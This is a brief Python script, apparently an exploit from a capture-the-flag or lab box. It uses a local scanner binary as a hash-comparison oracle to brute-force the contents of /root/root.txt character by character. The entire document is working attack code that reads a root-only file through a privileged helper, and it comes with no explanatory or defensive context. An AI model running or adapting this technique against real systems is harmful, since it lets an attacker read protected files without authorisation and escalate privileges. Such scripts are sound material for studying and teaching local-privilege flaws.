import subprocess
import hashlib
import string

charset = string.ascii_letters + string.digits + "+-=/\n"

def brute(file, guess):
    hash = hashlib.md5(guess.encode()).hexdigest()
    result = subprocess.run(['/opt/scanner/scanner','-c', file, '-l', str(len(guess)), '-s', hash], stdout=subprocess.PIPE)
    if len(result.stdout) > 0:
        return True
    return False

guess=""
print(guess,end='')
LOOP=True
while (LOOP):
    for char in charset:
        if brute("/root/root.txt", guess+char):
            guess += char
            print(char, end="",flush=True)
            break
        if char=="\n":
            LOOP=False